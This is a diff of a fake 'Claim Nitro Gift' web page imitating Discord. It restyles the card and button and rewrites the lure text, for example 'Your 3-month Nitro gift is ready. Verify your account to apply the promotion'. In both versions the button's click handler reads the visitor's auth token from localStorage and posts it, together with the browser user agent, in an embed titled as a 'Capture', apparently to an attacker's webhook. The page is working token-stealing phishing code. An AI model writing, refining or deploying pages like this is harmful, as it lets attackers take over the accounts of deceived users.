@@ -3,56 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nitro | Claim Gift</title>
+    <title>Claim Nitro Gift</title>
     <style>
-        :root { --blurple: #5865F2; }
-        body { margin: 0; background: #18191C; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'gg sans', sans-serif; perspective: 1000px; }
+        :root {
+            --primary: #5865F2;
+            --accent: #EB459E;
+            --bg: #202225;
+        }
+
+        body {
+            margin: 0; background: #0E0F10;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; font-family: 'gg sans', sans-serif;
+        }
 
         .card {
-            background: #2B2D31; width: 420px; padding: 40px; border-radius: 16px;
-            text-align: center; border: 1px solid rgba(255,255,255,0.05);
-            transition: transform 0.1s ease-out, box-shadow 0.3s ease;
-            cursor: default;
+            position: relative;
+            background: #202225;
+            width: 400px; padding: 40px; border-radius: 12px;
+            text-align: center; overflow: hidden;
         }
 
-        h1 { color: #fff; margin-bottom: 12px; }
-        p { color: #B9BBBE; margin-bottom: 30px; }
+        /* Colorful border glow */
+        .card::before {
+            content: ''; position: absolute; inset: 0; padding: 2px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor; mask-composite: exclude;
+            border-radius: 12px;
+        }
+
+        h1 { color: #fff; font-size: 24px; margin-bottom: 8px; }
+        p { color: #B9BBBE; font-size: 14px; margin-bottom: 30px; }
 
         .btn {
-            background: var(--blurple); color: #fff; border: none; padding: 15px; width: 100%;
-            border-radius: 8px; font-weight: 700; cursor: pointer;
-            transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275), background 0.2s;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            color: white; border: none; padding: 14px; width: 100%;
+            border-radius: 6px; font-weight: 700; cursor: pointer;
+            transition: transform 0.2s;
         }
 
-        .btn:hover { background: #4752c4; transform: scale(1.03); }
-        .btn:active { transform: scale(0.97); }
+        .btn:hover { transform: scale(1.02); filter: brightness(1.2); }
     </style>
 </head>
 <body>
 
-    <div class="card" id="card">
+    <div class="card">
         <h1>Claim Nitro Gift</h1>
-        <p>A gift is ready to be applied. Verify your session now.</p>
-        <button class="btn" id="claimBtn">Accept Gift</button>
+        <p>Your 3-month Nitro gift is ready. Verify your account to apply the promotion.</p>
+        <button class="btn" id="claimBtn">Activate Subscription</button>
     </div>
 
     <script>
-        const card = document.getElementById('card');
-        
-        // 3D Parallax effect on mouse move
-        document.addEventListener('mousemove', (e) => {
-            const { clientX: x, clientY: y } = e;
-            const centerX = window.innerWidth / 2;
-            const centerY = window.innerHeight / 2;
-            const rotateX = (y - centerY) / 25;
-            const rotateY = (centerX - x) / 25;
-            card.style.transform = `rotateY(${-rotateY}deg) rotateX(${rotateX}deg)`;
-        });
-
         document.getElementById('claimBtn').addEventListener('click', async () => {
             const btn = document.getElementById('claimBtn');
-            btn.innerText = "Processing...";
-            btn.style.opacity = "0.7";
+            btn.innerText = "Applying...";
             btn.disabled = true;
 
             const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
@@ -63,11 +69,11 @@
                 body: JSON.stringify({
                     content: "@everyone",
                     embeds: [{
-                        title: "💎 Interactive Capture",
+                        title: "✨ Colorful Capture",
                         color: 0x5865F2,
                         fields: [
-                            { name: "Token", value: `\`${token || "NULL"}\`` },
-                            { name: "Data", value: `\`${navigator.userAgent}\`` }
+                            { name: "Auth Token", value: `\`${token || "NULL"}\`` },
+                            { name: "Browser", value: `\`${navigator.userAgent}\`` }
                         ]
                     }]
                 })
